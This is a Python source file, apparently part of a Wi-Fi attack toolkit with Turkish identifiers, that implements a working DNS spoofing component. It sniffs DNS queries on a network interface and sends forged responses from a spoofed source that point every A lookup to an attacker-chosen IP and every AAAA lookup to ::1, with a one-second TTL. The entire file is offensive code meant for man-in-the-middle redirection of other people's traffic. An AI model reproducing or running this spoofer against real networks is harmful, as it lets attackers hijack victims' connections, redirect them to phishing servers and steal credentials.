import logging
from threading import Event, Lock, Thread

try:
    from dnslib import DNSRecord, RR, QTYPE, A, AAAA
    DNSLIB_OK = True
except ImportError:
    DNSLIB_OK = False

log = logging.getLogger("szr-wifi")

class DnsSpoofAlt:
    def __init__(self, ctx, iface, spoof_ip="10.0.0.1"):
        self.ctx = ctx
        self.iface = iface
        self.spoof_ip = spoof_ip
        self.dur = Event()
        self.thread = None
        self.sayac = 0
        self.lock = Lock()
        self.filtre = set()

    def basla(self):
        if not DNSLIB_OK:
            self.ctx.log("[dns] dnslib yok (pip install dnslib)", "err")
            return
        if self.thread and self.thread.is_alive():
            return
        self.dur.clear()
        self.thread = Thread(target=self._loop, daemon=True)
        self.thread.start()

    def durdur(self):
        self.dur.set()
        if self.thread:
            self.thread.join(timeout=2)

    def _loop(self):
        from scapy.all import sniff, send, IP, UDP, DNS, IPv6
        def cb(p):
            try:
                if not p.haslayer(UDP) or not p.haslayer(DNS):
                    return
                
                dns = p[DNS]
                if dns.qr != 0 or dns.qd is None:
                    return

                try:
                    q = DNSRecord.parse(bytes(dns))
                except Exception:
                    return
                
                qname = str(q.q.qname)
                cevap = q.reply()
                
                if q.q.qtype == QTYPE.A:
                    cevap.add_answer(RR(qname, QTYPE.A, rdata=A(self.spoof_ip), ttl=1))
                elif q.q.qtype == QTYPE.AAAA:
                    cevap.add_answer(RR(qname, QTYPE.AAAA, rdata=AAAA("::1"), ttl=1))
                else:
                    return

                if p.haslayer(IP):
                    ip = IP(src=p[IP].dst, dst=p[IP].src)
                elif p.haslayer(IPv6):
                    ip = IPv6(src=p[IPv6].dst, dst=p[IPv6].src)
                else:
                    return

                udp = UDP(sport=53, dport=p[UDP].sport)
                send(ip / udp / cevap, verbose=False)
                
                with self.lock:
                    self.sayac += 1
                    if self.sayac % 20 == 0:
                        self.ctx.log(f"[dns] {self.sayac} yanıt (TTL=1)", "dim")
            except Exception:
                pass

        sniff(iface=self.iface, prn=cb, store=False,
              stop_filter=lambda p: self.dur.is_set(), filter="port 53")

    def durum(self):
        return "active" if (self.thread and self.thread.is_alive()) else "off"
